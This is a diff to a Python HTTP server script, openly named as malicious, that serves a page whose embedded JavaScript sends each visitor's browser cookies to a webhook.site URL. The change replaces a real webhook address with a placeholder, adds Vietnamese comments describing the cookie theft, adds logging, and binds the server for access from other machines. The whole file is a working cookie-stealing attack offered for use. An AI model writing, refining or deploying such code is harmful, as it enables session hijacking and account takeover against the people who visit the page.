@@ -1,4 +1,5 @@
 from http.server import SimpleHTTPRequestHandler, HTTPServer
+import logging
 
 class MaliciousHTTPRequestHandler(SimpleHTTPRequestHandler):
     def do_GET(self):
@@ -15,7 +16,8 @@ class MaliciousHTTPRequestHandler(SimpleHTTPRequestHandler):
         <body>
             <h1>Welcome to my site!</h1>
             <script>
-                document.location="https://webhook.site/24803643-1704-45e0-9979-e10085d609fb/steal?cookie=" + document.cookie;
+                // Đoạn JavaScript để lấy cookie của người dùng
+                document.location="https://webhook.site/your-webhook-url?cookie=" + document.cookie;
             </script>
         </body>
         </html>
@@ -24,15 +26,18 @@ class MaliciousHTTPRequestHandler(SimpleHTTPRequestHandler):
 
 if __name__ == "__main__":
     # Địa chỉ và cổng của server
-    host = "0.0.0.0"
+    host = "0.0.0.0"  # Đảm bảo có thể truy cập từ các máy khác
     port = 8080
+
+    # Khởi tạo logging để dễ dàng theo dõi lỗi
+    logging.basicConfig(level=logging.INFO)
+    logging.info(f"Starting server on {host}:{port}")
 
     # Khởi chạy server
     server = HTTPServer((host, port), MaliciousHTTPRequestHandler)
-    print(f"Malicious HTTP server running on {host}:{port}")
-    print("Press Ctrl+C to stop the server.")
+    logging.info(f"Server running on {host}:{port}. Press Ctrl+C to stop.")
     try:
         server.serve_forever()
     except KeyboardInterrupt:
-        print("\nShutting down the server.")
+        logging.info("\nShutting down the server.")
         server.server_close()
